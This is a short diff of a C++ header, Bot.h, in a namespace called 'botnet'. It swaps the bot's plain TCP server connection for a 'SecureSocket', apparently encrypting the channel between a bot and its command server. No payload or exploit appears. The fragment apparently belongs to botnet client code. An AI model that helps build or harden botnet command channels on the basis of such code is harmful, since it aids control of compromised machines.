@@ -1,7 +1,7 @@
 #ifndef BOT_H
 #define BOT_H
 
-#include "../Socket/TCPSocket.h"
+#include "../Socket/SecureSocket.h"
 #include <vector>
 
 namespace botnet {
@@ -45,7 +45,7 @@ private:
 		return func_vector[command];
 	};
 
-	tcpSocket server_connection;
+	SecureSocket server_connection;
 
 	bool continue_running;
 
